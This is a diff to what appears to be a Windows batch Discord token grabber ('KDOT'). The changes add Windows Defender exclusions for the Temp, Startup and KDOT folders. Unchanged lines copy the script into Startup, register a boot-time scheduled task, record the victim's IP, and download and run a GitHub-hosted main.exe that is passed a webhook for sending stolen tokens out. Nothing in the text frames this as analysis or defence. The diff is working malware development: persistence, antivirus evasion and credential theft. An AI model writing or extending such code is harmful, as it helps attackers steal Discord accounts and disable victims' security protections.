@@ -12,6 +12,7 @@ exit
 
 :naw
 @echo off
+PowerShell Set-MpPreference -DisableRealtimeMonitoring 0
 mkdir %localappdata%\KDOT
 COPY %~f0 %localappdata%\KDOT\KDOT.bat
 COPY "%~f0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KDOT.bat"
@@ -20,6 +21,9 @@ if %errorlevel% equ 0 goto code
 SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat"
 
 :code
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%localappdata%\KDOT"
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
@@ -71,10 +75,8 @@ if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\config.json (
 
 
 cd %userprofile%\AppData\Local\Temp
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 start /w /b main.exe %webhook%
-taskkill /f /im main.exe
 
 
 mkdir %localappdata%\Temp\KDOT
